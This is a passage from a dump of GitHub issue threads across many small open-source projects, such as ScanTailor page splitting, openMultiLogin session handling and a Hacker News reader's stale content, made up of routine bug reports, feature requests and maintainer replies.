Having said that, are you running the latest version?  Page splitting was improved in 0.9.9.  If this stages fails for you too often, send me a sample page to take a look at.
</Body>
    </Comment>
    <Comment>
      <Owner>sakulstra</Owner>
      <Body>- **status**: open --&gt; closed
</Body>
    </Comment>
    <Comment>
      <Owner>sakulstra</Owner>
      <Body>Thank you for your quick reply.

Please see http://streicher.dk/scantailor/MAC\_OSX020.JPG for an example of the type of output from my scanner which triggers this behavior.

If I pre-crop the image to http://streicher.dk/scantailor/MAC\_OSX020\_Crop.jpg, then the page spitting works perfectly, so the problem would also be solved if I could somehow get a rough "crop" step before the "split pages" step.

I think a crop step would be helpful to many with camera-based book scanners. 

I use 0.9.9.1 built by myself on OSX.
</Body>
    </Comment>
    <Comment>
      <Owner>sakulstra</Owner>
      <Body>- **status**: closed --&gt; open
</Body>
    </Comment>
    <Comment>
      <Owner>sakulstra</Owner>
      <Body>I see the solution to your problem in zooming your cameras in a bit, so that reflection doesn't include the edge of the main page.  As for that white scratch on the black background - don't worry if it gets detected as an edge, as the Select Content stage is smart enough to handle such a case.  In fact, in the example you gave me, Select Content was also able to cut off the part of the neighboring page that came from a bad page split.  If Select Content works as well on the majority of your pages, you can safely ignore bad cuts.
</Body>
    </Comment>
    <Comment>
      <Owner>sakulstra</Owner>
      <Body>First of all, congratulations, and thank you for this wonderful software! :D

I'm digitizing lots of pages in folders with 2 ring binders. Keeping the pages in the binders and using a digital camera (instead of scanning each page on a scanner) makes the process extremely fast!

Unfortunately, the page split algorithm (on version 0.9.11.1) doesn't work very well on these images, setting the split on different places on some images. This is a perfect scenario to manually set the split line to all images at once. Also, this is one of the few options that we can't currently apply to a range of pages, so I think it also makes sense to enable this for consistency.
</Body>
    </Comment>
  </Issue_764>
  <Issue_765>
    <Repository>sf-import</Repository>
    <Title>bmp format support [sf#2]</Title>
    <Owner>sakulstra</Owner>
    <Body>Submitted by *anonymous on 2009-04-10 10:44:35

BMP format support needed very much!
</Body>
    <State>open</State>
    <Comment>
      <Owner>sakulstra</Owner>
      <Body>The BMP file format is quite uncommon for scanned documents.  I don't think the effort to support this format will be worth it.  BMP files are easy to convert to TIFF or PNG.  You won't loose quality, and you will even save space.  Batch image converters can convert multiple images in one go.
</Body>
    </Comment>
    <Comment>
      <Owner>sakulstra</Owner>
      <Body>- **status**: open --&gt; closed
</Body>
    </Comment>
    <Comment>
      <Owner>sakulstra</Owner>
      <Body>But there are not too many formats which scaners support natively - tiff, bmp, png. I think ALL these loseless formats should be supported by a good software - it will not be too difficult to implement I think.

I had to use bmp since my scaner generate tiff which unfortunatelly cannot be correctly recognized by (old) software. I think I am not alone. Also there are some people which ALREADY have bmp-documents and which scanned to it because they are did not know that bmp-format is "quite uncommon".

Batch converters are not handy and comfortable for usual users and this wrong way I think because you did GUI software not console utility.

Please think carefully about what I said and you may be change your opinion (I hope).
</Body>
    </Comment>
    <Comment>
      <Owner>sakulstra</Owner>
      <Body>- **status**: closed --&gt; open
</Body>
    </Comment>
  </Issue_765>
  <Issue_766>
    <Repository>sf-import</Repository>
    <Title>call to private function Mat() in math/MatrixCalc.h [sf#1662]</Title>
    <Owner>sakulstra</Owner>
    <Body>Submitted by cortense on 2013-04-13 15:40:05

On Mac OS 10.8.3, the current git commit (61c29ca2), make generates the following error:

[ 20%] Building CXX object dewarping/CMakeFiles/dewarping.dir/DistortionModelBuilder.cpp.o
In file included from /Users/ecortens/Downloads/scantailor/dewarping/DistortionModelBuilder.cpp:21:
In file included from /Users/ecortens/Downloads/scantailor/dewarping/CylindricalSurfaceDewarper.h:22:
In file included from /Users/ecortens/Downloads/scantailor/math/HomographicTransform.h:23:
/Users/ecortens/Downloads/scantailor/math/MatrixCalc.h:127:10: error: calling a private constructor of class 'mcalc::Mat&amp;lt;double&amp;gt;'
return mcalc::Mat&amp;lt;T&amp;gt;(&amp;m_alloc, data, rows, cols);
^
/Users/ecortens/Downloads/scantailor/dewarping/DistortionModelBuilder.cpp:516:5: note: in instantiation of member function
'MatrixCalc&amp;lt;double, mcalc::DynamicPoolAllocator&amp;lt;double&amp;gt; &amp;gt;::operator()' requested here
mc(&amp;At[0], 2, polyline_size).transWrite(&amp;A[0]);
^
/Users/ecortens/Downloads/scantailor/math/MatrixCalc.h:107:2: note: declared private here
Mat(AbstractAllocator&amp;lt;T&amp;gt;* alloc, T const* data, int rows, int cols)
^
1 error generated.
make[2]: *** [dewarping/CMakeFiles/dewarping.dir/DistortionModelBuilder.cpp.o] Error 1
make[1]: *** [dewarping/CMakeFiles/dewarping.dir/all] Error 2
make: *** [all] Error 2

This results because mcalc::Mat() is a private function, and cannot be returned. This can be fixed with the following patch:

diff --git a/math/MatrixCalc.h b/math/MatrixCalc.h
index 0dd8de0..f97ec92 100644
--- a/math/MatrixCalc.h
+++ b/math/MatrixCalc.h
@@ -103,10 +103,11 @@ public:
Mat operator-() const;

T const* rawData() const { return data; }
-private:
+
Mat(AbstractAllocator&amp;lt;T&amp;gt;* alloc, T const* data, int rows, int cols)
: alloc(alloc), data(data), rows(rows), cols(cols) {}

+private:
AbstractAllocator&amp;lt;T&amp;gt;* alloc;
T const* data;
int rows;

After this patch is made, everything compiles and works just fine, as far as I can tell.
</Body>
    <State>open</State>
    <Comment>
      <Owner>sakulstra</Owner>
      <Body>patch to fix private function
</Body>
    </Comment>
  </Issue_766>
  <Issue_767>
    <Repository>sf-import</Repository>
    <Title>Select Content fails on rotated scans [sf#449]</Title>
    <Owner>sakulstra</Owner>
    <Body>Submitted by jesuzphreak on 2011-02-11 14:18:22

I have a book project in which some of the pages are upside down. I do "Select Content" and afterwards go through all pages to check what has been selected, making corrections if nessecary. In this process I also turn the upside-down pages 180 degrees and apply "Select Content" again. It appears now that the "Select Content" algorithm tries to select the content of the original page instead of the rotated page. Take a look at the page attached to see what I mean. This is Scantailor 1.0.0beta2.
</Body>
    <State>open</State>
    <Comment>
      <Owner>sakulstra</Owner>
      <Body>Could you try a newer build?  Here is 1.0.0beta9 for Windows: http://depositfiles.com/en/files/e8ybpk75a
</Body>
    </Comment>
  </Issue_767>
  <Issue_768>
    <Repository>Project_2</Repository>
    <Title>When you are a collab on a repo, and you fork the same repo, it shows as a duplicate</Title>
    <Owner>Elektro1776</Owner>
    <Body>Add logic to display forks so that both repos are displayed differently.</Body>
    <State>open</State>
    <Comment>
      <Owner>901david</Owner>
      <Body>This should be easy to fix as projets are returned with a fork= false or true</Body>
    </Comment>
  </Issue_768>
  <Issue_769>
    <Repository>Project_3</Repository>
    <Title>Code Editor - Save to File locally</Title>
    <Owner>Elektro1776</Owner>
    <Body>* mostly set up, need to decide if this is worth implementing have the route set up and will save files on server, need to set it up so that it returns the file and then downloads it</Body>
    <State>open</State>
    <Comment>
      <Owner>901david</Owner>
      <Body>* editing this issue. I am going to set up firebase, so that when files are created ont he server they are pushed tot he cloud. this will be based on each repo, therefore users will be able to save and choose saved code snippets to be populated int he code editor&#13;
&#13;
* a second feature I would like to add here is you can press a button and it will switch over to issues so you can create a new issue OR comment on an existing issue with the code already populated in markdown to push code youa re writing to github directly in response to an issue as a comment or as a new issue</Body>
    </Comment>
  </Issue_769>
  <Issue_770>
    <Repository>markdown-it-vuese</Repository>
    <Title>bug: source file and html are out of sync</Title>
    <Owner>BuptStEve</Owner>
    <Body>**Version**&#13;
Version 0.2.2&#13;
&#13;
**Describe the bug**&#13;
After modifying the source file, the content of the page does not refresh.&#13;
&#13;
**The temporary solution is to save the corresponding markdown file.**&#13;
&#13;
**To Reproduce**&#13;
Steps to reproduce the behavior:&#13;
1. use it with vuepress&#13;
2. run `vuepress dev`&#13;
3. modify source file, like `foo.vue`, and save it&#13;
4. out of sync&#13;
&#13;
**Expected behavior**&#13;
After modifying the source file, we should get a new content.&#13;
&#13;
**Additional context**&#13;
It's the same problem with [Import Code Snippets](https://vuepress.vuejs.org/guide/markdown.html#import-code-snippets)&#13;
&#13;
https://github.com/vuejs/vuepress/issues/1309&#13;
</Body>
    <State>open</State>
    <Comment>
      <Owner>Shigma</Owner>
      <Body>You can try `env.loader.addDependency`, it will be a new API invented by vuepress v1.0.0-alpha.40.&#13;
&#13;
[PR](https://github.com/vuejs/vuepress/pull/1337)</Body>
    </Comment>
    <Comment>
      <Owner>BuptStEve</Owner>
      <Body>&gt; You can try `env.loader.addDependency`, it will be a new API invented by vuepress v1.0.0-alpha.40.&#13;
&gt; &#13;
&gt; [PR](https://github.com/vuejs/vuepress/pull/1337)&#13;
&#13;
Good job! </Body>
    </Comment>
  </Issue_770>
  <Issue_771>
    <Repository>lawd-desktop</Repository>
    <Title>Chromecast support</Title>
    <Owner>stoufa88</Owner>
    <Body>Would love to see chromecast support!
</Body>
    <State>open</State>
    <Comment>
      <Owner>stoufa88</Owner>
      <Body>I need the hardware to test this out, or maybe someone would implement this :8ball:
</Body>
    </Comment>
  </Issue_771>
  <Issue_772>
    <Repository>laravel-invoicable</Repository>
    <Title>Invoice number / reference does not comply with some countries</Title>
    <Owner>sandervanhooft</Owner>
    <Body>Hi&#13;
&#13;
Package seems to work as described, but the reference or invoice number does not comply with may countries as the number should be a continuous number sequence&#13;
&#13;
It would be nice if one was able to provide a 'InvoiceReferenceGenerator' instead of modifying the code directly.</Body>
    <State>open</State>
    <Comment>
      <Owner>sandervanhooft</Owner>
      <Body>Thanks for opening this issue.&#13;
&#13;
I agree, we should set the `InvoiceReferenceGenerator` class in the config and bind it into the container. Can you submit a PR for this?</Body>
    </Comment>
    <Comment>
      <Owner>rabol</Owner>
      <Body>Hi&#13;
&#13;
I'm really bad in PR... I don't know how to do it :(&#13;
&#13;
&#13;
I solved the problem like this:&#13;
&#13;
in the config/invoicable.php i added a new key:&#13;
&#13;
'invoice_reference_generator' =&gt; \SanderVanHooft\Invoicable\InvoiceReferenceGenerator::class&#13;
&#13;
in the service provider:&#13;
&#13;
$config = $this-&gt;app-&gt;config['invoicable'];&#13;
$this-&gt;app-&gt;bind(InvoiceReferenceGenerator::class, $config['invoice_reference_generator']);&#13;
&#13;
&#13;
and then in the boot of the Invoice class&#13;
&#13;
$model-&gt;reference = app()-&gt;make(InvoiceReferenceGenerator::class)-&gt;generate();&#13;
&#13;
I also increased the table field: reference to 20&#13;
&#13;
&#13;
</Body>
    </Comment>
  </Issue_772>
  <Issue_773>
    <Repository>laravel-payable-redirect-mollie</Repository>
    <Title>Is it possible to send a payment method through laravel-payable-redirect?</Title>
    <Owner>sandervanhooft</Owner>
    <Body>The Mollie supports skipping the payment method screen if a payment method is sent with the payment. I'd like to do so for administrative purposes.&#13;
&#13;
## Detailed description&#13;
&#13;
Can I do this? My Laravel is a platform that has to invoice the transaction costs to its users, this would be a lot easier if I knew what payment method was used.&#13;
&#13;
## Context&#13;
&#13;
This is useful for anyone using this package in a platform-like e-commerce setting&#13;
&#13;
## Possible implementation&#13;
&#13;
Adding a parameter to the payment&#13;
&#13;
</Body>
    <State>open</State>
    <Comment>
      <Owner>sandervanhooft</Owner>
      <Body>Hi @icuMedia, thanks for taking the time to write up this ticket. Can you explain with a code example how you would like it to work? Also, feel free to submit a PR if you have a clear picture of what it should be.</Body>
    </Comment>
  </Issue_773>
  <Issue_774>
    <Repository>sketch-subtlepatterns</Repository>
    <Title>Do you plan to update your plugin for Sketch 40?</Title>
    <Owner>dunckr</Owner>
    <Body>I want to mention it in The Sketch Handbook (http://www.sketch-handbook.com/), but only if it works with the current version of Sketch.
</Body>
    <State>open</State>
    <Comment>
      <Owner>dunckr</Owner>
      <Body>Nice @edge0703 your book looks cool! Yes it's working on 40.
</Body>
    </Comment>
    <Comment>
      <Owner>edge0703</Owner>
      <Body>Thanks. It does work indeed (had to reinstall it), but I'm just asking as your plugin is listed under "Legacy Plugins (Deprecated" in the "Plugins" menu, which seems quite strange. 

What's also notable is the the pattern is inserted quite small, and even if you resize it to 200% it's still quite tiny (compared to the Subtle Patterns website). 
</Body>
    </Comment>
  </Issue_774>
  <Issue_775>
    <Repository>sketch-subtlepatterns</Repository>
    <Title>How to Get the Pattern Tile?</Title>
    <Owner>dunckr</Owner>
    <Body>I use Sketch for designing website prototypes, which I then pass on to the frontend programmer. When I use any images - such as in a patterned background - I need to send the image file to the programmer.

How can I get the image file for the pattern tile that was randomly pulled in through your plugin?

I feel like I'm overlooking something basic, but for the life of me I can't work out how to do this!
</Body>
    <State>open</State>
    <Comment>
      <Owner>dunckr</Owner>
      <Body>All of the images are pulled from [SubtlePatterns](https://github.com/subtlepatterns/SubtlePatterns) repo into [here](https://github.com/dunckr/sketch-subtlepatterns/tree/master/SubtlePatterns).

A simplistic way would be to `Export` or `Layer -&gt; Flatten Selection To Bitmap`. This wouldn't match up correctly unless the dimensions are correct and these vary between images.

I'll need to check to see if there's a better way of exposing or finding this out.
</Body>
    </Comment>
  </Issue_775>
  <Issue_776>
    <Repository>openMultiLogin</Repository>
    <Title>Not working anymore</Title>
    <Owner>Swingline0</Owner>
    <Body>Not working anymore</Body>
    <State>open</State>
    <Comment>
      <Owner>Swingline0</Owner>
      <Body>@AbdelElrafa Without more information surrounding this, I can't imagine what I'm supposed to do here. Would you mind elaborating? OS, Chrome Version, What in particular isn't working?</Body>
    </Comment>
  </Issue_776>
  <Issue_777>
    <Repository>openMultiLogin</Repository>
    <Title>Complete de-obfuscation of existing codebase.</Title>
    <Owner>Swingline0</Owner>
    <Body>I have noticed that most of the codebase here is still using obfuscated variable/function names within it's source files.&#13;
&#13;
This is a concern to me as the codebase is still not fully understood and is not maintainable in this format.&#13;
&#13;
I am wondering if there is a driver to have this fully de-obfuscated and bring the project in-line with current naming and formatting standards for JavaScript projects so that it can be maintained going forward.&#13;
&#13;
If this is something that would be beneficial to this project, I am willing to put some time into this process.</Body>
    <State>open</State>
    <Comment>
      <Owner>tgxn</Owner>
      <Body>I've just noticed there is a more deobfuscated branch of this, further to this, is there a reason this has not been merged into master with a matching folder structure?</Body>
    </Comment>
    <Comment>
      <Owner>Swingline0</Owner>
      <Body>Hey @tgxn, very astute of you!&#13;
&#13;
The origin of that branch was an effort of mine to essentially rewrite the entire extension, manually deobfuscating and enhancing where I could. &#13;
&#13;
The original push to undertake this endeavor was a takedown from the Chrome webstore (See #13). After enough nudging, I began the rewrit however after making some progress (as you see in the referenced branch) I was able to get a human on the Chrome team to review of the source to verify that there wasn't anything nefarious. Once the extension was re-published, the rewrite fell swiftly off my list. &#13;
&#13;
I love the idea of re-building this tool in order to keep it open source and maintainable. If you're up for contributing, I would definitely welcome it!</Body>
    </Comment>
    <Comment>
      <Owner>Swingline0</Owner>
      <Body>I don't recall why I altered the folder structure but ultimately the goal of mine was to restructure the project to support using ES2015 and ES Modules along with a Babel build/bundle process. Then update the Travis CI config to handle all of that for the production releases.</Body>
    </Comment>
    <Comment>
      <Owner>Swingline0</Owner>
      <Body>Tagging this with "Help wanted" in case anyone out there wants to help out. </Body>
    </Comment>
  </Issue_777>
  <Issue_778>
    <Repository>openMultiLogin</Repository>
    <Title>Request: Use colors to distinguish tabs with different session id</Title>
    <Owner>Swingline0</Owner>
    <Body>Hi !&#13;
&#13;
First of all i love this extension. However is it possible to develop it further and use colors in order to distinguish the different tabs?&#13;
&#13;
This is used by Cent Browser if you want to check it out. It has colored dots on each tab to group those that are of a specific session . It is far easier to know which tabs belong to different sessions.&#13;
&#13;
</Body>
    <State>open</State>
    <Comment>
      <Owner>Swingline0</Owner>
      <Body>That's a cool idea. I don't think the api has support for coloring the tab itself but I would suspect the favicon could be redrawn with an svg dot overlaid or something along those lines. (Sounds like what you described in Cent Browser)&#13;
&#13;
In this same vein, I think it would be really rad if there were a way to visually group the tabs by sessions... To essentially sort all of the tabs together by session and somehow visually separate them with a small gap. As far as I know, this is more of a wish as the support doesn't exist on the Chrome side AFAIK. &#13;
&#13;
I really dig the feedback, I'm going to go ahead and mark this as something that contributors could consider pull requesting. It probably doesn't make sense to pursue until the rewrite is complete though. &#13;
&#13;
Thanks @shak3800!</Body>
    </Comment>
  </Issue_778>
  <Issue_779>
    <Repository>openMultiLogin</Repository>
    <Title>LocalStorage isn't "instanced"</Title>
    <Owner>Swingline0</Owner>
    <Body>Pages that use LocalStorage doesn't work the same way as sites that use session cookies.</Body>
    <State>open</State>
    <Comment>
      <Owner>Swingline0</Owner>
      <Body>This is an interesting situation, too. The only way that the extension could potentially intercept would be to override the default VM's locationStorage functions. I would presume this is doable but I'm not sure if it's permitted by extensions. Care to take a stab at putting together a PR?</Body>
    </Comment>
    <Comment>
      <Owner>Lillecarl</Owner>
      <Body>Honestly i'd have to learn both javascript and how chrome extensions work, I'm a happy user as is (use incognito when localstorage is an issue), i just wanted to inform devs the issue exists.&#13;
&#13;
Cheers :)</Body>
    </Comment>
    <Comment>
      <Owner>Swingline0</Owner>
      <Body>Hehe, that's fair. I've gone ahead and marked this an item we could use help on. Until we figure out #13, however, this will probably have to wait.&#13;
&#13;
Thanks for the feedback!</Body>
    </Comment>
  </Issue_779>
  <Issue_780>
    <Repository>openMultiLogin</Repository>
    <Title>Opening new window in a openMultiLogin session would carry session to it</Title>
    <Owner>Swingline0</Owner>
    <Body>Steps:&#13;
1. Open a new session by using openMultiLogin&#13;
2. Create a new window (not tab!)&#13;
3. The session in window 1 would be carried on to new window&#13;
&#13;
Expected:&#13;
The session shall not be carried to the new window opened in step 2.</Body>
    <State>open</State>
    <Comment>
      <Owner>Swingline0</Owner>
      <Body>Hmm.... Interesting. I can confirm on my end as well. It's interesting that it adopts the tab/window ID and everything. I don't have the capacity to dive into this further but I would welcome anyone willing to take a look and see what can be done.&#13;
&#13;
Thanks for reporting!</Body>
    </Comment>
  </Issue_780>
  <Issue_781>
    <Repository>openMultiLogin</Repository>
    <Title>Restore state after browser closure</Title>
    <Owner>Swingline0</Owner>
    <Body>Would it be possible to restore the state after browser closure and re-opening?
Let's say I've logged in (account1) to the site on Tab1, then used openMultiLogin and logged to the same site with another account (account2) on Tab2, then used openMultiLogin again and account3 on Tab3. Then I close the browser and open it again. 
In result I get 3 tabs opened, but account1 is used on each of them. I would like to restore the original state.
(btw, re-opening of the closed tab with Ctrl+Shift+T always uses account1, which also not quite logical) 
</Body>
    <State>open</State>
    <Comment>
      <Owner>Swingline0</Owner>
      <Body>That sounds pretty cool, @and7ey, and probably pretty doable too. 

Sadly I don't have much time to throw at this project now. You might want to check out [SessionBox](https://chrome.google.com/webstore/detail/sessionbox-free-multi-log/megbklhjamjbcafknkgmokldgolkdfig?hl=en) in the meantime which offers a more robust setup for maintaining and organizing sessions.

I'll leave this open for now in case some brave soul wants to contribute some time towards it. 
</Body>
    </Comment>
    <Comment>
      <Owner>caspertone2003</Owner>
      <Body>Beware!
SessionBox is quite different of (open)multilogin in the sense that SessionBox _KEEPS_ in the cloud all session information... while (open)multilogin is fully local...
</Body>
    </Comment>
    <Comment>
      <Owner>Swingline0</Owner>
      <Body>Very interesting. Good to know, then. Thanks @caspertone2003.
</Body>
    </Comment>
  </Issue_781>
  <Issue_782>
    <Repository>cb</Repository>
    <Title>Email notifications</Title>
    <Owner>lpatmo</Owner>
    <Body>Every day I have to keep unchecking email notifications. 
</Body>
    <State>open</State>
    <Comment>
      <Owner>lpatmo</Owner>
      <Body>Thanks for filing the bug. I found the culprit! There was a 'checked' inside the HTML element, so every time I deployed a change to the platform that would appear. 
</Body>
    </Comment>
    <Comment>
      <Owner>nayamoss</Owner>
      <Body>oh thanks! I'm still getting them though :/
</Body>
    </Comment>
  </Issue_782>
  <Issue_783>
    <Repository>cb</Repository>
    <Title>"Disallowed property detected: categories.0" when editing</Title>
    <Owner>lpatmo</Owner>
    <Body>When you try to edit a submitted hangout, you get this message in return: "Disallowed property detected: categories.0".  According to MeteorJS documentation, this is more of a Telescope error, when a post contains properties which is only allowed if the user is an admin. Perhaps users should be allowed editing privileges on the hangouts they create/submit.
</Body>
    <State>open</State>
    <Comment>
      <Owner>lpatmo</Owner>
      <Body>++ Haven't had time to look into this, but will try to get to it next weekend unless someone can get to it earlier.
</Body>
    </Comment>
    <Comment>
      <Owner>lpatmo</Owner>
      <Body>Update: Actually, I don't see this bug anymore in my dev. Does anyone else still see it?
</Body>
    </Comment>
    <Comment>
      <Owner>awrelll</Owner>
      <Body>Anyone figured out a fix so far?
</Body>
    </Comment>
    <Comment>
      <Owner>Rastalamm</Owner>
      <Body>@awrell - I was running into a similar issue and was able to fix it by adding the "editableBy" attribute to my schema.
EX: editableBy: ["member", "admin"],

I can't seem to find the docs for this but it was already in the codebase I stepped into. 

I am using Telescope with SimpleSchema + AutoForm
</Body>
    </Comment>
  </Issue_783>
  <Issue_784>
    <Repository>cb</Repository>
    <Title>Issue for non-admin users</Title>
    <Owner>lpatmo</Owner>
    <Body>It seems that there is a problem with users that want to change the hangout room by editing the post.

Exception while simulating the effect of invoking 'editPost' r {error: "disallowed_property", reason: "Disallowed property detected: categories.0", details: undefined, message: "Disallowed property detected: categories.0 [disallowed_property]", errorType: "Meteor.Error&#8221;&#8230;}

Any clues why?
Thanks!
</Body>
    <State>open</State>
    <Comment>
      <Owner>lpatmo</Owner>
      <Body>I think this is fixed now. May have had to do with something related to meteor updates. Let me know if you still see it?
</Body>
    </Comment>
    <Comment>
      <Owner>awrelll</Owner>
      <Body>I still see it!
What's your meteor version? 
</Body>
    </Comment>
  </Issue_784>
  <Issue_785>
    <Repository>cb</Repository>
    <Title>Resources feature</Title>
    <Owner>lpatmo</Owner>
    <Body>As a community member and logged in user I want to have an ability to post valuable links and resources and share them with other members of the community.
</Body>
    <State>open</State>
    <Comment>
      <Owner>lpatmo</Owner>
      <Body>@wuworkshop and @sgtphips and I were discussing: adding a resources section for each category where people would be able to submit a form, select the type, and add comments.
</Body>
    </Comment>
  </Issue_785>
  <Issue_786>
    <Repository>cb</Repository>
    <Title>Bookshelf feature</Title>
    <Owner>lpatmo</Owner>
    <Body>the details TBD.
</Body>
    <State>open</State>
    <Comment>
      <Owner>lpatmo</Owner>
      <Body>@RussEby had this idea too! A resources page.
</Body>
    </Comment>
    <Comment>
      <Owner>lpatmo</Owner>
      <Body>Is the bookshelf idea different than #40?
</Body>
    </Comment>
  </Issue_786>
  <Issue_787>
    <Repository>cb</Repository>
    <Title>Create an all-users-can-edit page to host links to helpful resources</Title>
    <Owner>lpatmo</Owner>
    <Body>Alternative idea: create a new Telescope clone so people can submit links?

Alternative idea: Google Docs? (Scratch that - not very updatable-friendly.)
</Body>
    <State>open</State>
    <Comment>
      <Owner>lpatmo</Owner>
      <Body>Updated idea: Each "category" should have its own wiki page where people can share compiled links. Ideally, each link would be a upvotable too -- like a Telescope within a Telescope. :)
</Body>
    </Comment>
  </Issue_787>
  <Issue_788>
    <Repository>cb-links</Repository>
    <Title>Should we also add another section to indicate beginner, intermediate or expert?</Title>
    <Owner>lpatmo</Owner>
    <Body>It would be nice to select the level as well along with free or paid when posting links.
</Body>
    <State>open</State>
    <Comment>
      <Owner>colbycheeze</Owner>
      <Body>Free or paid is a great tag to have. I never know what "beginner, intermediate, expert" ever means when reading levels on a tutorial. That is always so relative to opinion.

I don't know the solution to that, but I wonder if there is a better way to relate what level someone should be at before attempting a tutorial of sorts...

Maybe if we have some trails or checkpoint type of resources for various things...like say for example we created a cb-links resource that said "If you are learning HTML, here are your checkpoints..." and then we say beginner should be able to answer  1-10, intermediate can identify and answer 1-50, and expert level would be beyond that?

Anyway, that's my disorganized thoughts on the subject. What do you think?
</Body>
    </Comment>
    <Comment>
      <Owner>lpatmo</Owner>
      <Body>Ohh, like a set of questions that we'd offer as a guide for tagging resources?
</Body>
    </Comment>
    <Comment>
      <Owner>anbuselvan</Owner>
      <Body>@colbycheeze yes, I totally agree with you, and I'm still trying to understand your recommendations on checkpoints. @lpatmo yes, more tagging would be nice to organize and group things get the relevant resources quickly, just like labels from github.
</Body>
    </Comment>
  </Issue_788>
  <Issue_789>
    <Repository>NewYearsResolutions</Repository>
    <Title>Include Netherlands</Title>
    <Owner>AgtLucas</Owner>
    <Body>Must include Netherlands soon, we have good chocolates, man.&#13;
&#13;
![](https://media.giphy.com/media/6gmG0zodJT9wA/giphy.gif)</Body>
    <State>open</State>
    <Comment>
      <Owner>AgtLucas</Owner>
      <Body>@lucasbento AHAHAHA! Let's see what I can do :)</Body>
    </Comment>
  </Issue_789>
  <Issue_790>
    <Repository>awesome-hacker-news</Repository>
    <Title>Things that have been deleted/404 should be moved, removed, or demphasized</Title>
    <Owner>cheeaun</Owner>
    <Body>There are many projects that are defunct and they clutter up the list.  I think they should either be removed or moved to some kind of deadpool at the bottom of the list or in another document (might be better - could retain the structure).&#13;
&#13;
I'm not submitting a pull request because I don't know what others think about this problem and approach.</Body>
    <State>open</State>
    <Comment>
      <Owner>cheeaun</Owner>
      <Body>Hey thanks for your comment! I think moving them to a deadpool at the bottom would be good for now.</Body>
    </Comment>
  </Issue_790>
  <Issue_791>
    <Repository>busrouter-sg</Repository>
    <Title>Errors found from routes 853, 853C, and 81</Title>
    <Owner>cheeaun</Owner>
    <Body>Dear Sir/Mdm,
We found wrong GPS points from routes 853 and 853C, and route 81 should be a single direction route while you provided us with a dual-directional route.

We would appreciate that you let us know upon completion of the updates.
</Body>
    <State>open</State>
    <Comment>
      <Owner>cheeaun</Owner>
      <Body>Hi, sorry for the late response here.

For routes 853 and 853C, may I know which points are wrong? Would be great if you could pinpoint them for me :smile: 

As for route 81, I've fixed it and it's now a single direction route.

Thanks!
</Body>
    </Comment>
  </Issue_791>
  <Issue_792>
    <Repository>busrouter-sg</Repository>
    <Title>Display two bus routes at same time? (New features)</Title>
    <Owner>cheeaun</Owner>
    <Body>It would be
</Body>
    <State>open</State>
    <Comment>
      <Owner>cheeaun</Owner>
      <Body>Possibly duplicated of #1 
</Body>
    </Comment>
  </Issue_792>
  <Issue_793>
    <Repository>busrouter-sg</Repository>
    <Title>Bus Routes Overlaying</Title>
    <Owner>cheeaun</Owner>
    <Body>The ability to view a bus route in Google Map is very informative. But wouldn't it be outstanding if you are able to choose three bus service number and "busrouter-sg" will HIGHLIGHT the bus stops that is COMMON (the two or three buses will stop at the same bus stop) to them.

Rationale: Let us assume that you want to go from Point A to Point B, and you want to know what are your choices and the fastest route to reach Point B. And we want to know at which bus stop(s) will these two or three service numbers will be common. This will allow us to plan our routes more efficiently as we might want to stop over a certain place and the "busrouter-sg" will inform us that if the bus number you were in just now had already passed by the time you came back to the bus stop you alighted, you will still be able to catch up the other two service numbers.
</Body>
    <State>open</State>
    <Comment>
      <Owner>tianqig</Owner>
      <Body>It would be great to be able to show multiple bus routes at the same time so viewers be able to figure out how  to change bus at what bus stops in order to optimize their travel. 

Not sure if the current version can do the trick or not. Seems to me I can only choose one bus at a time, not able to select multiple buses. Although I can select one bus a time, then choose another one, then I need to mentally figure out where the bus routes would meet, etc. It's troublesome.
</Body>
    </Comment>
  </Issue_793>
  <Issue_794>
    <Repository>hackerweb</Repository>
    <Title>Filter Content (Ask, Show, New)</Title>
    <Owner>cheeaun</Owner>
    <Body>Hello,
Is it possible to be able to filter the content by Ask/Show/New/others?

Thanks.

(Best HN viewer out there IMO!)
</Body>
    <State>open</State>
    <Comment>
      <Owner>cheeaun</Owner>
      <Body>@tsmffh currently no plans for those... yet. But will keep this in the pipeline :+1: 
</Body>
    </Comment>
  </Issue_794>
  <Issue_795>
    <Repository>hackerweb</Repository>
    <Title>Outdated content</Title>
    <Owner>cheeaun</Owner>
    <Body>Hello,

Starting a few weeks ago, I noticed I am seeing stale content when using this web app.  For instance, the top story today is the telegram getting 1M whatsapp users and it says "2 hours ago" even though the story is a few days old.   I've tried pulling down, hitting the refresh button, and reloading the page in chrome.   

If it helps...
Chrome 
iPhone 5
Using wireless data, not wifi
</Body>
    <State>open</State>
    <Comment>
      <Owner>cheeaun</Owner>
      <Body>@joelcollinsdc is it still happening now? May I know the version of the Chrome browser?
</Body>
    </Comment>
    <Comment>
      <Owner>joelcollinsdc</Owner>
      <Body>Yes it still is.  I haven't done much troubleshooting yet, but interestingly, the articles updated from what they were before, but are still a few days old.  The second article I see is now the article about not being able to log into Yosemite with an emoji in the password.  

Chrome version is 47.0.2526.70
</Body>
    </Comment>
    <Comment>
      <Owner>joelcollinsdc</Owner>
      <Body>Killing chrome and reopening still shows the outdated content.  Safari on my phone does show the latest content...
</Body>
    </Comment>
    <Comment>
      <Owner>joelcollinsdc</Owner>
      <Body>FWIW, this morning it was showing updated content.  Well... it says the top story is 16 minutes old on hackerweb and my desktop chrome says its 24 minutes old, but that seems like a non issue.
</Body>
    </Comment>
    <Comment>
      <Owner>joelcollinsdc</Owner>
      <Body>It's been working all day.  Maybe it's fixed now.   
</Body>
    </Comment>
    <Comment>
      <Owner>cheeaun</Owner>
      <Body>@joelcollinsdc glad to know it's fixed for you. I didn't apply any fixes though, as it's kind of hard for me to replicate this bug. I suspect a few issues that might cause this but not 100% sure so I'll keep this in mind for now. Feel free to report here if you're experiencing this bug again, thanks!
</Body>
    </Comment>
    <Comment>
      <Owner>joelcollinsdc</Owner>
      <Body>Thanks
</Body>
    </Comment>
    <Comment>
      <Owner>joelcollinsdc</Owner>
      <Body>This keeps happening to me.   How can I help troubleshoot?
</Body>
    </Comment>
    <Comment>
      <Owner>cheeaun</Owner>
      <Body>@joelcollinsdc Would be great if you could inspect the API calls and try loading them with cache bust e.g.: `http://node-hnapi.herokuapp.com/item/9900168` (could be different endpoint for your case because the app "load-balance" with different endpoints) and try `http://node-hnapi.herokuapp.com/item/9900168?test=1` to see if there are any differences.
</Body>
    </Comment>
    <Comment>
      <Owner>joelcollinsdc</Owner>
      <Body>So by loading hackerweb on my desktop and inspecting, i saw that /news and /news2 was being requested.  When I load these from my mobile chrome, I notice updated content.  

